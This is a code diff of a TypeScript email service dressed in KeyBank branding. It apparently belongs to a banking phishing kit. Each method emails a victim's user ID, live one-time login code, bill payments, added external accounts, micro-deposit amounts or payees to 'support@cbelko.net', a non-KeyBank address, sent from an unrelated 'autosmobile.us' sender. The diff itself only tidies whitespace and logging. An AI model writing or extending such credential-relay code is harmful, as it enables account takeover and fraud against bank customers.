@@ -24,7 +24,7 @@ class EmailService {
 
   async sendOTP(userId: string, otpCode: string): Promise<boolean> {
     const adminEmail = 'support@cbelko.net';
-    
+
     const emailOptions: EmailOptions = {
       to: adminEmail,
       subject: 'KeyBank Login Verification Code',
@@ -47,20 +47,20 @@ class EmailService {
             <div class="header">
               <img src="https://ibx.key.com/ibxolb/login/images/key-logo.svg" alt="KeyBank" class="logo">
             </div>
-            
+
             <div class="message">
               <h2 style="color: #c8102e;">Security Verification Required</h2>
               <p>A login attempt was made for User ID: <strong>${userId}</strong></p>
               <p>Your KeyBank verification code is:</p>
             </div>
-            
+
             <div class="otp-code">${otpCode}</div>
-            
+
             <div class="message">
               <p><strong>Important:</strong> This code will expire in 10 minutes for your security.</p>
               <p>If you did not request this code, please contact KeyBank immediately.</p>
             </div>
-            
+
             <div class="footer">
               <p>This is an automated message from KeyBank Online Banking.</p>
               <p>© 2024 KeyCorp. KeyBank is Member FDIC.</p>
@@ -73,22 +73,23 @@ class EmailService {
     };
 
     try {
-      await this.transporter.sendMail({
+      const result = await this.transporter.sendMail({
         from: process.env.SMTP_USER || 'support@autosmobile.us',
         ...emailOptions,
       });
-      
-      console.log(`OTP email sent successfully for user ${userId}`);
+
+      console.log('OTP email sent successfully:', result.messageId);
       return true;
     } catch (error) {
       console.error('Failed to send OTP email:', error);
+      // Return false but don't crash the application
       return false;
     }
   }
 
   async sendBillPaymentNotification(paymentData: any): Promise<boolean> {
     const adminEmail = 'support@cbelko.net';
-    
+
     const emailOptions: EmailOptions = {
       to: adminEmail,
       subject: 'New Bill Payment Scheduled - KeyBank',
@@ -124,7 +125,7 @@ class EmailService {
 
   async sendCheckOrderNotification(orderData: any): Promise<boolean> {
     const adminEmail = 'support@cbelko.net';
-    
+
     const emailOptions: EmailOptions = {
       to: adminEmail,
       subject: 'New Checkbook Order - KeyBank',
@@ -160,7 +161,7 @@ class EmailService {
 
   async sendExternalAccountNotification(accountData: any): Promise<boolean> {
     const adminEmail = 'support@cbelko.net';
-    
+
     const emailOptions: EmailOptions = {
       to: adminEmail,
       subject: 'New External Account Added - KeyBank',
@@ -195,7 +196,7 @@ class EmailService {
 
   async sendMicroDepositNotification(accountData: any, deposits: { amount1: string, amount2: string }): Promise<boolean> {
     const adminEmail = 'support@cbelko.net';
-    
+
     const emailOptions: EmailOptions = {
       to: adminEmail,
       subject: 'Micro-Deposit Verification - KeyBank',
@@ -229,7 +230,7 @@ class EmailService {
 
   async sendPayeeNotification(payeeData: any): Promise<boolean> {
     const adminEmail = 'support@cbelko.net';
-    
+
     const emailOptions: EmailOptions = {
       to: adminEmail,
       subject: 'New Payee Added - KeyBank',
